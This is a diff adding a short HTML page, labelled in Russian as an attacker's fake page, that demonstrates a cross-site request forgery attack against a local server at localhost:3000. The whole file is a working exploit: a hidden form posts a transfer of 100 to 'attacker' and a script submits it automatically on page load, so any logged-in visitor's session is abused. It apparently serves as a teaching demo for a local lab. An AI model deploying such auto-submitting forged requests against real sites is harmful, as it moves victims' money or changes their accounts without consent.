@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Злоумышленник: CSRF</title>
+</head>
+<body>
+  <h1>Фейковая страница с CSRF‑атакой</h1>
+  <p>
+    Если вы залогинены на сервере 
+    <code>http://localhost:3000</code>,
+    эта страница автоматически отправит форму перевода.
+  </p>
+
+  <!-- Форма, которая отправляется на ваш сервер -->
+  <form id="exploitForm" action="http://localhost:3000/transfer" method="post">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="100">
+  </form>
+
+  <script>
+    // Автоматически отправляем форму
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("exploitForm").submit();
+    });
+  </script>
+</body>
+</html>
